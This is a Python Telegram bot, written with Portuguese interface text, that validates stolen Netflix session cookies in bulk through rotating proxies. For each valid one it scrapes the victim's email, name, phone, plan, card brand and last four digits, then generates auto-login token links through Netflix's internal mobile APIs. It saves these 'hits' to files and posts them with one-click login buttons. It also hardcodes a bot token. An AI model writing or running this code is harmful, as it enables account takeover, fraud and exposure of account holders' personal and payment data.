import re
import json
import time
import os
import threading
import requests
import urllib3
import urllib.parse
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
import logging
from logging.handlers import RotatingFileHandler

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ✅ TOKEN NOVO E SEGURO
BOT_TOKEN = "8691326863:AAG-PHpLIvKqeBD0D_KHdwXgtjRONEfgOiI"
DEVELOPER = "@jhonatan_felipe447"
VERSION = "2.3.0"

# 🔒 IDs dos ADMINS (só eles usam /stats e /logs)
ADMIN_IDS = [8546034216]

os.makedirs("logs", exist_ok=True)
os.makedirs("hits", exist_ok=True)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s', handlers=[RotatingFileHandler("logs/bot.log", maxBytes=10*1024*1024, backupCount=5, encoding='utf-8'), logging.StreamHandler()])
logger = logging.getLogger(__name__)

# 🛡️ Palavras bloqueadas (SPAM)
SPAM_WORDS = ['luckybear', 'казино', 'casino', 'bond', 'wndpr', 'lucky', 'bear', 'ставки', 'ставка', 'играть', 'выигрыш', 'приз', 'бонус', 't.me/', 'https://t.me/', 'https://wndpr', 'https://bond']

UA_WEB = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
UA_ANDROID = "com.netflix.mediaclient/63884 (Linux; U; Android 13)"

COUNTRY_FLAGS = {"US":"🇺🇸","GB":"🇬🇧","DE":"🇩🇪","FR":"🇫🇷","ES":"🇪🇸","IT":"🇮🇹","TR":"🇹🇷","BR":"🇧🇷","JP":"🇯🇵","KR":"🇰🇷","IN":"🇮🇳","CA":"🇨🇦","AU":"🇦🇺","MX":"🇲🇽","NL":"🇳🇱","SE":"🇸🇪","NO":"🇳🇴","DK":"🇩🇰","FI":"🇫🇮","PL":"🇵🇱","RU":"🇷🇺","AR":"🇦🇷","CL":"🇨🇱","CO":"🇨🇴","PE":"🇵🇪","AE":"🇦🇪","SA":"🇸🇦","EG":"🇪🇬","ZA":"🇿🇦","ID":"🇮🇩","MY":"🇲🇾","SG":"🇸🇬","TH":"🇹🇭","VN":"🇻🇳","PH":"🇵🇭","KE":"🇰🇪","NG":"🇳🇬","GH":"🇬🇭","PT":"🇵🇹","RO":"🇷🇴","HU":"🇭🇺","CZ":"🇨🇿","UA":"🇺🇦","AT":"🇦🇹","CH":"🇨🇭","BE":"🇧🇪","IL":"🇮🇱","TW":"🇹🇼","HK":"🇭🇰","PK":"🇵🇰","BO":"🇧🇴","GT":"🇬🇹","EC":"🇪🇨","UY":"🇺🇾","NZ":"🇳🇿","ZW":"🇿🇼","SK":"🇸🇰","HR":"🇭🇷","RS":"🇷🇸","BG":"🇧🇬"}

COUNTRY_NAMES = {"US":"United States","GB":"United Kingdom","DE":"Germany","FR":"France","ES":"Spain","IT":"Italy","TR":"Turkey","BR":"Brazil","JP":"Japan","KR":"South Korea","IN":"India","CA":"Canada","AU":"Australia","MX":"Mexico","NL":"Netherlands","SE":"Sweden","NO":"Norway","DK":"Denmark","FI":"Finland","PL":"Poland","RU":"Russia","AR":"Argentina","CL":"Chile","CO":"Colombia","PE":"Peru","AE":"UAE","SA":"Saudi Arabia","EG":"Egypt","ZA":"South Africa","ID":"Indonesia","MY":"Malaysia","SG":"Singapore","TH":"Thailand","VN":"Vietnam","PH":"Philippines","KE":"Kenya","NG":"Nigeria","GH":"Ghana","PT":"Portugal","RO":"Romania","HU":"Hungary","CZ":"Czech Republic","UA":"Ukraine","AT":"Austria","CH":"Switzerland","BE":"Belgium","IL":"Israel","TW":"Taiwan","HK":"Hong Kong","PK":"Pakistan","NZ":"New Zealand","SK":"Slovakia","HR":"Croatia","RS":"Serbia","BG":"Bulgaria"}

def _djs(s):
    if not s: return ""
    s = re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), s)
    s = re.sub(r'\\u([0-9a-fA-F]{4})', lambda m: chr(int(m.group(1), 16)), s)
    return s.strip()

def _rx(pattern, text, default=""):
    m = re.search(pattern, text, re.S)
    return m.group(1) if m else default

def _rx_all(pattern, text):
    return re.findall(pattern, text, re.S)

def _flag(cc):
    return COUNTRY_FLAGS.get((cc or "").upper(), "🌍")

def _country(cc):
    return COUNTRY_NAMES.get((cc or "").upper(), cc or "Unknown")

def parse_netscape(text):
    cookies = {}
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"): continue
        parts = line.split("\t")
        if len(parts) >= 7: cookies[parts[5]] = parts[6]
    return cookies

def parse_json_cookies(text):
    try:
        data = json.loads(text)
        if isinstance(data, list): return {c["name"]: c["value"] for c in data if "name" in c and "value" in c}
        if isinstance(data, dict): return data
    except: pass
    return {}

def load_cookies(text):
    text = text.strip()
    if text.startswith("[") or text.startswith("{"):
        c = parse_json_cookies(text)
        if c: return c
    c = parse_netscape(text)
    if c: return c
    cookies = {}
    for part in re.split(r"[;\n]", text):
        part = part.strip()
        if "=" in part:
            k, _, v = part.partition("=")
            k, v = k.strip(), v.strip()
            if k: cookies[k] = v
    return cookies

_IOS_API = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
_IOS_PARAMS = {"appVersion":"15.48.1","config":'{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","billboardEnabled":"true","sharksEnabled":"true","useCDSGalleryEnabled":"true","avifFormatEnabled":"false"}',"device_type":"NFAPPL-02-","esn":"NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200","idiom":"phone","iosVersion":"15.8.5","isTablet":"false","languages":"en-US","locale":"en-US","maxDeviceWidth":"375","model":"saget","modelType":"IPHONE8-1","odpAware":"true","path":'["account","token","default"]',"pathFormat":"graph","pixelDensity":"2.0","progressive":"false","responseFormat":"json"}
_IOS_HEADERS = {"User-Agent":"Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)","x-netflix.request.attempt":"1","x-netflix.request.client.user.guid":"A4CS633D7VCBPE2GPK2HL4EKOE","x-netflix.context.profile-guid":"A4CS633D7VCBPE2GPK2HL4EKOE","x-netflix.request.routing":'{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',"x-netflix.context.app-version":"15.48.1","x-netflix.argo.translated":"true","x-netflix.context.form-factor":"phone","x-netflix.context.sdk-version":"2012.4","x-netflix.client.appversion":"15.48.1","x-netflix.context.max-device-width":"375","x-netflix.context.ab-tests":"","x-netflix.tracing.cl.useractionid":"4DC655F2-9C3C-4343-8229-CA1B003C3053","x-netflix.client.type":"argo","x-netflix.client.ftl.esn":"NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200","x-netflix.context.locales":"en-US","x-netflix.context.top-level-uuid":"90AFE39F-ADF1-4D8A-B33E-528730990FE3","x-netflix.client.iosversion":"15.8.5","accept-language":"en-US;q=1","x-netflix.argo.abtests":"","x-netflix.context.os-version":"15.8.5","x-netflix.request.client.context":'{"appState":"foreground"}',"x-netflix.context.ui-flavor":"argo","x-netflix.argo.nfnsm":"9","x-netflix.context.pixel-density":"2.0","x-netflix.request.toplevel.uuid":"90AFE39F-ADF1-4D8A-B33E-528730990FE3","x-netflix.request.client.timezoneid":"Asia/Dhaka"}

def generate_nftoken(netflix_id_raw, timeout=15, proxy=None):
    if not netflix_id_raw: return None
    netflix_id = urllib.parse.unquote(str(netflix_id_raw))
    proxies = {"http": proxy, "https": proxy} if proxy else None
    headers = dict(_IOS_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"
    try:
        r = requests.get(_IOS_API, params=_IOS_PARAMS, headers=headers, proxies=proxies, timeout=timeout, verify=False)
        if r.status_code == 200:
            data = r.json()
            token_data = ((((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {})
            tok = token_data.get("token")
            if tok: return str(tok)
    except: pass
    try:
        sess2 = requests.Session()
        sess2.cookies.set("NetflixId", netflix_id, domain=".netflix.com", path="/")
        if proxies: sess2.proxies, sess2.verify = proxies, False
        payload = {"operationName":"CreateAutoLoginToken","variables":{"scope":"WEBVIEW_MOBILE_STREAMING"},"extensions":{"persistedQuery":{"version":102,"id":"76e97129-f4b5-41a0-a73c-12e674896849"}}}
        r2 = sess2.post("https://android13.prod.ftl.netflix.com/graphql", json=payload, headers={"User-Agent":UA_ANDROID,"Accept":"application/json","Content-Type":"application/json"}, timeout=timeout)
        if r2.status_code == 200:
            d = r2.json()
            tok = (d.get("data") or {}).get("createAutoLoginToken")
            if tok: return str(tok)
    except: pass
    return None

def check_account(cookies: dict, proxy=None, timeout=20):
    if not any(cookies.get(k) for k in ["NetflixId","SecureNetflixId"]): return None
    sess = requests.Session()
    sess.headers.update({"User-Agent":UA_WEB,"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Accept-Language":"en-US,en;q=0.9","DNT":"1"})
    for k, v in cookies.items(): sess.cookies.set(k, str(v), domain=".netflix.com", path="/")
    if proxy: sess.proxies, sess.verify = {"http":proxy,"https":proxy}, False
    try: r = sess.get("https://www.netflix.com/account", allow_redirects=True, timeout=timeout)
    except: return None
    if "login" in r.url.lower() or r.status_code in (401,403): return None
    html = r.text
    if '"membershipStatus":"CURRENT_MEMBER"' not in html: return None
    email = _djs(_rx(r'"emailAddress":"([^"]+)"', html))
    name = _djs(_rx(r'"userInfo":\{"name":"([^"]+)"', html))
    if not name: name = _djs(_rx(r'"firstName":"([^"]+)"', html))
    cc = _rx(r'"countryOfSignup":"([A-Z]{2,3})"', html, "XX")
    since = _djs(_rx(r'"memberSince":"([^"]+)"', html))
    if not since:
        ts_raw = _rx(r'"memberSince":\{"fieldType":"Numeric","value":(\d+)\}', html)
        if ts_raw and ts_raw.isdigit():
            try: since = datetime.utcfromtimestamp(int(ts_raw)/1000).strftime("%B %Y")
            except: since = "N/A"
    plan = _djs(_rx(r'"localizedPlanName":\{"fieldType":"String","value":"([^"]+)"\}', html))
    plan_id = _rx(r'"planId":\{"fieldType":"String","value":"([^"]+)"\}', html)
    price = _djs(_rx(r'"planPrice":\{"fieldType":"String","value":"([^"]+)"\}', html))
    q_raw = _rx(r'"videoQuality":\{"fieldType":"String","value":"([^"]+)"\}', html).upper()
    quality_map = {"UHD":"UHD 4K","FHD":"FHD 1080p","HD":"HD 720p","SD":"SD 480p"}
    quality = quality_map.get(q_raw, q_raw or "N/A")
    streams = _rx(r'"maxStreams":\{"fieldType":"Numeric","value":(\d+)\}', html, "N/A")
    nextbill = _djs(_rx(r'"nextBillingDate":\{"fieldType":"String","value":"([^"]+)"\}', html))
    _pm_start = html.find('"paymentMethods"')
    pm_raw = html[_pm_start:_pm_start+3000] if _pm_start>=0 else ""
    card_brand = _rx(r'"paymentOptionLogo":"([^"]+)"', pm_raw)
    if not card_brand: card_brand = _rx(r'"type":\{"fieldType":"String","value":"([^"]+)"\}', pm_raw)
    pay_type = _rx(r'"paymentMethod":\{"fieldType":"String","value":"([^"]+)"\}', pm_raw)
    card_last4 = _rx(r'"GrowthCardPaymentMethod"[^}]*"displayText":"([^"]+)"', pm_raw)
    if not card_last4: card_last4 = _rx(r'"displayText":\{"fieldType":"String","value":"([^"]+)"\}', pm_raw)
    phone = _djs(_rx(r'"phoneNumber":"([^"]*)"', html)) or "N/A"
    pv_raw = _rx(r'"isPhoneVerified":(?:\{"fieldType":"Boolean","value":)?(true|false)', html)
    phone_verified = pv_raw == "true"
    extra_raw = _rx(r'"extraMemberSlots":\{"fieldType":"Numeric","value":(\d+)\}', html, "0")
    extra_slots = int(extra_raw) if extra_raw.isdigit() else 0
    can_change = '"canChangePlan":{"fieldType":"Boolean","value":true}' in html
    free_trial = '"isInFreeTrial":true' in html
    profiles = [_djs(p) for p in _rx_all(r'"profileName":"([^"]+)"', html)]
    if not profiles: profiles = [_djs(p) for p in _rx_all(r'"profileName":\{"fieldType":"String","value":"([^"]+)"\}', html)]
    seen = set()
    profiles_clean = []
    for p in profiles:
        if p and p not in seen: seen.add(p); profiles_clean.append(p)
    user_guid = _rx(r'"userGuid":"([^"]+)"', html)
    netflix_id_raw = cookies.get("NetflixId","")
    tok = generate_nftoken(netflix_id_raw, timeout, proxy=proxy) if netflix_id_raw else None
    if tok:
        tok_safe = urllib.parse.quote(tok, safe="")
        login_pc = f"https://netflix.com/?nftoken={tok_safe}"
        login_phone = f"https://netflix.com/unsupported?nftoken={tok_safe}"
    else: login_pc, login_phone = "N/A", "N/A"
    login_tv = "https://www.netflix.com/tv2"
    display_name = name or (profiles_clean[0] if profiles_clean else "N/A")
    return {"email":email or "N/A","name":display_name,"country_code":cc,"country":_country(cc),"plan":plan or "N/A","plan_id":plan_id or "N/A","price":price or "N/A","member_since":since or "N/A","next_billing":nextbill or "N/A","free_trial":free_trial,"can_change":can_change,"video_quality":quality,"max_streams":str(streams),"extra_slots":extra_slots,"card_brand":card_brand or "N/A","card_last4":card_last4 or "N/A","payment_method":pay_type or "N/A","phone":phone,"phone_verified":phone_verified,"profiles":profiles_clean,"profile_count":len(profiles_clean),"user_guid":user_guid or "N/A","netflix_id_raw":netflix_id_raw,"login_pc":login_pc,"login_phone":login_phone,"login_tv":login_tv}

class NetflixChecker:
    def __init__(self, threads=5, proxy=None, timeout=20):
        self.threads, self.timeout = threads, timeout
        self._proxy_list = proxy if isinstance(proxy, list) else ([proxy] if proxy else [])
        self._proxy_index = 0
        self.lock = threading.Lock()
        self.stats = {"total":0,"checked":0,"hits":0,"bad":0,"errors":0,"start":time.time()}
        self.hits = []

    def _next_proxy(self):
        if not self._proxy_list: return None
        with self.lock:
            p = self._proxy_list[self._proxy_index % len(self._proxy_list)]
            self._proxy_index += 1
        if p and not p.startswith(("http://","https://","socks4://","socks5://")): p = "http://"+p
        return p

    def process_cookie(self, cookie_text):
        cookies = load_cookies(cookie_text)
        try: result = check_account(cookies, proxy=self._next_proxy(), timeout=self.timeout)
        except:
            with self.lock: self.stats["errors"]+=1; self.stats["checked"]+=1
            return None
        with self.lock:
            self.stats["checked"]+=1
            if result:
                self.stats["hits"]+=1
                result["cookie_raw"] = cookie_text.strip()
                self.hits.append(result)
                self._save_hit(result, cookie_text)
                return result
            else: self.stats["bad"]+=1; return None

    def process_batch(self, cookies_list):
        self.stats["total"], self.stats["start"] = len(cookies_list), time.time()
        results = []
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(self.process_cookie, c) for c in cookies_list if c.strip()]
            for future in as_completed(futures):
                try:
                    result = future.result()
                    if result: results.append(result)
                except: pass
        return results

    def _save_hit(self, acc, raw_cookie):
        safe_email = re.sub(r'[\\/:*?"<>|]', "_", acc["email"])
        fname = f"[{acc['country_code']}] [{safe_email}] - {acc['plan']}.txt"
        path = os.path.join("hits", fname)
        profs = ", ".join(acc["profiles"]) if acc["profiles"] else "N/A"
        nf_id = acc.get("netflix_id_raw","")
        cookie_val = f"NetflixId={nf_id}" if nf_id else acc.get("cookie_raw","")
        with open(path, "w", encoding="utf-8") as f:
            f.write(f"Email: {acc['email']}\nName: {acc['name']}\nCountry: {acc['country']} ({acc['country_code']})\nPlan: {acc['plan']}\nPrice: {acc['price']}\nMember Since: {acc['member_since']}\nNext Billing: {acc['next_billing']}\nFree Trial: {'Yes' if acc['free_trial'] else 'No'}\nVideo Quality: {acc['video_quality']}\nMax Streams: {acc['max_streams']}\nExtra Slots: {acc['extra_slots']}\nCard: {acc['card_brand']} *{acc['card_last4']}\nPayment Method: {acc['payment_method']}\nPhone: {acc['phone']} | Verified: {acc['phone_verified']}\nProfiles ({acc['profile_count']}): {profs}\n\nLogin PC: {acc['login_pc']}\nLogin Phone: {acc['login_phone']}\nLogin TV: {acc['login_tv']}\n\nCookie: {cookie_val}\n")

    def get_stats(self):
        elapsed = time.time() - self.stats["start"]
        cpm = (self.stats["checked"]/elapsed*60) if elapsed>0 else 0
        return {"total":self.stats["total"],"checked":self.stats["checked"],"hits":self.stats["hits"],"bad":self.stats["bad"],"errors":self.stats["errors"],"elapsed":f"{elapsed:.1f}s","cpm":f"{cpm:.1f}"}

class NetflixCheckerBot:
    def __init__(self, token):
        self.token = token
        self.app = Application.builder().token(token).build()
        self.checker = NetflixChecker(threads=5)
        self.user_sessions = {}
        self.app.add_handler(CommandHandler("start", self.start_command))
        self.app.add_handler(CommandHandler("help", self.help_command))
        self.app.add_handler(CommandHandler("stats", self.stats_command))
        self.app.add_handler(CommandHandler("logs", self.logs_command))
        self.app.add_handler(CommandHandler("done", self.done_command))
        self.app.add_handler(CommandHandler("cancel", self.cancel_command))
        self.app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_message))

    def is_admin(self, user_id):
        return user_id in ADMIN_IDS

    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        logger.info(f"User {user.id} (@{user.username}) started bot")
        await update.message.reply_text(
            f"<b>╔══════════════════════════════════════╗</b>\n"
            f"<b>║     🎬 NETFLIX CHECKER BOT v{VERSION}    ║</b>\n"
            f"<b>╚══════════════════════════════════════╝</b>\n\n"
            f"<b>👨‍💻 Desenvolvedor:</b> {DEVELOPER}\n\n"
            f"🔑 Envie seu cookie para gerar <b>NFToken</b>!\n"
            f"🎯 /help - Comandos disponíveis\n\n"
            f"🛡️ <b>Antispam ATIVADO!</b>\n"
            f"🔒 /stats e /logs - Só ADM",
            parse_mode="HTML"
        )

    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await update.message.reply_text(
            f"<b>╔══════════════════════════════════════╗</b>\n"
            f"<b>║        📚 COMANDOS DISPONÍVEIS        ║</b>\n"
            f"<b>╚══════════════════════════════════════╝</b>\n\n"
            f"🎬 /start - Menu principal\n"
            f"📋 /help - Esta ajuda\n"
            f"📦 /done - Processar lote\n"
            f"❌ /cancel - Cancelar operação\n\n"
            f"🔒 /stats - Estatísticas (ADM)\n"
            f"📊 /logs - Ver logs (ADM)\n\n"
            f"🛡️ Spam bloqueado automaticamente!\n\n"
            f"👨‍💻 {DEVELOPER}",
            parse_mode="HTML"
        )

    async def stats_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        if not self.is_admin(user.id):
            await update.message.reply_text("🔒 <b>ACESSO RESTRITO!</b>\nApenas o administrador pode usar este comando.", parse_mode="HTML")
            return
        if self.checker.stats["checked"] == 0:
            await update.message.reply_text("📊 Nenhuma estatística ainda.")
            return
        stats = self.checker.get_stats()
        await update.message.reply_text(
            f"<b>╔══════════════════════════════════════╗</b>\n"
            f"<b>║        📊 ESTATÍSTICAS               ║</b>\n"
            f"<b>╚══════════════════════════════════════╝</b>\n\n"
            f"📝 <b>Total:</b> {stats['total']}\n"
            f"✅ <b>Checados:</b> {stats['checked']}\n"
            f"🎯 <b>Hits:</b> {stats['hits']}\n"
            f"❌ <b>Bad:</b> {stats['bad']}\n"
            f"⚠️ <b>Erros:</b> {stats['errors']}\n"
            f"⏱ <b>Tempo:</b> {stats['elapsed']}\n"
            f"🚀 <b>CPM:</b> {stats['cpm']}\n\n"
            f"👨‍💻 {DEVELOPER}",
            parse_mode="HTML"
        )

    async def logs_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        if not self.is_admin(user.id):
            await update.message.reply_text("🔒 <b>ACESSO RESTRITO!</b>\nApenas o administrador pode usar este comando.", parse_mode="HTML")
            return
        try:
            logs_text = "<b>╔══════════════════════════════════════╗</b>\n<b>║        📊 ÚLTIMOS LOGS               ║</b>\n<b>╚══════════════════════════════════════╝</b>\n\n"
            if os.path.exists("logs/hits.log"):
                with open("logs/hits.log","r") as f:
                    hits = f.readlines()[-5:]
                if hits:
                    logs_text += "<b>🎯 Hits:</b>\n"
                    for h in hits:
                        logs_text += f"• {h.strip()[-80:]}\n"
            await update.message.reply_text(logs_text + f"\n👨‍💻 {DEVELOPER}" if logs_text != "" else "Nenhum log ainda.", parse_mode="HTML")
        except:
            await update.message.reply_text("❌ Erro ao ler logs.")

    async def done_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if user_id in self.user_sessions and self.user_sessions[user_id]:
            cookies_list = self.user_sessions[user_id]
            await update.message.reply_text(f"🔄 Processando {len(cookies_list)} cookies...")
            results = self.checker.process_batch(cookies_list)
            if results:
                await update.message.reply_text(f"✅ {len(results)} HITS!")
                for acc in results:
                    await self.send_hit_message(update, acc)
            else:
                await update.message.reply_text("❌ Nenhum hit.")
            self.user_sessions[user_id] = []
        else:
            await update.message.reply_text("ℹ️ Nenhum cookie pendente.")

    async def cancel_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        self.user_sessions[user_id] = []
        await update.message.reply_text("❌ Cancelado.")

    async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        message_text = update.message.text
        
        if any(word in message_text.lower() for word in SPAM_WORDS):
            logger.warning(f"SPAM bloqueado de @{user.username}: {message_text[:100]}")
            try: await update.message.delete()
            except: pass
            await update.message.reply_text("🚫 <b>SPAM BLOQUEADO!</b>\n\nMensagem removida.", parse_mode="HTML")
            return
        
        logger.info(f"Message from @{user.username}: {message_text[:100]}")
        
        if any(k in message_text.lower() for k in ['netflixid','securenflixid','.netflix.com']):
            await update.message.reply_text("🔍 Verificando...")
            result = self.checker.process_cookie(message_text)
            if result:
                await self.send_hit_message(update, result)
            else:
                await update.message.reply_text("❌ Cookie inválido.")
        else:
            user_id = user.id
            if user_id not in self.user_sessions: self.user_sessions[user_id] = []
            cookies = load_cookies(message_text)
            if cookies:
                self.user_sessions[user_id].append(message_text)
                count = len(self.user_sessions[user_id])
                await update.message.reply_text(f"📦 Cookie armazenado! ({count} na fila)\n/done para processar\n/cancel para cancelar")
            else:
                await update.message.reply_text("❌ Formato não reconhecido.\nUse /help para ajuda.")

    async def send_hit_message(self, update: Update, acc):
        cc = acc.get("country_code","XX")
        flag = _flag(cc)
        profs = ", ".join(acc["profiles"][:4]) if acc["profiles"] else "N/A"
        pv = "✅" if acc.get("phone_verified") else "❌"
        nf_id = acc.get("netflix_id_raw","")
        cookie_val = f"NetflixId={nf_id}" if nf_id else acc.get("cookie_raw","")
        
        caption = (
            f"<b>╔══════════════════════════════════════╗</b>\n"
            f"<b>║     🎬 NETFLIX PREMIUM HIT           ║</b>\n"
            f"<b>╚══════════════════════════════════════╝</b>\n\n"
            f"<b>👤 Nome:</b> {acc['name']}\n"
            f"<b>📧 Email:</b> <code>{acc['email']}</code>\n"
            f"<b>🌍 País:</b> {acc['country']} {flag} ({cc})\n\n"
            f"<b>╭─────────────────────────────────╮</b>\n"
            f"<b>│  📋 {acc['plan']}  •  💰 {acc['price']}</b>\n"
            f"<b>│  📅 Desde:</b> {acc['member_since']}\n"
            f"<b>│  🗓 Próxima cobrança:</b> {acc['next_billing']}\n"
            f"<b>│  🎁 Trial:</b> {'Sim' if acc['free_trial'] else 'Não'}\n"
            f"<b>╰─────────────────────────────────╯</b>\n\n"
            f"<b>╭─────────────────────────────────╮</b>\n"
            f"<b>│  🎥 Qualidade:</b> {acc['video_quality']}\n"
            f"<b>│  📺 Telas:</b> {acc['max_streams']} simultâneas\n"
            f"<b>│  ➕ Extra:</b> {acc['extra_slots']}\n"
            f"<b>│  💳 Cartão:</b> {acc['card_brand']} ****{acc['card_last4']}\n"
            f"<b>│  📞 Tel:</b> {acc['phone']}  {pv}\n"
            f"<b>│  👥 Perfis:</b> {acc['profile_count']} ({profs})\n"
            f"<b>╰─────────────────────────────────╯</b>\n\n"
            f"<b>🍪 Cookie:</b>\n<code>{cookie_val[:100]}</code>\n\n"
            f"<b>👨‍💻 {DEVELOPER}</b>"
        )
        
        buttons = []
        row1 = []
        if acc.get("login_pc") and acc["login_pc"] != "N/A":
            row1.append(InlineKeyboardButton("🖥 PC", url=acc["login_pc"]))
        if acc.get("login_phone") and acc["login_phone"] != "N/A":
            row1.append(InlineKeyboardButton("📱 Phone", url=acc["login_phone"]))
        if row1: buttons.append(row1)
        buttons.append([InlineKeyboardButton("📺 TV", url=acc["login_tv"])])
        markup = InlineKeyboardMarkup(buttons)
        
        if len(caption) > 4000:
            caption = caption[:3900] + "...\n\n👨‍💻 " + DEVELOPER
        
        await update.message.reply_text(caption, parse_mode="HTML", reply_markup=markup)

    def run(self):
        logger.info(f"Bot iniciado - Dev: {DEVELOPER} - ANTISPAM ATIVO - ADMIN PROTEGIDO")
        self.app.run_polling()

if __name__ == "__main__":
    bot = NetflixCheckerBot(BOT_TOKEN)
    bot.run()
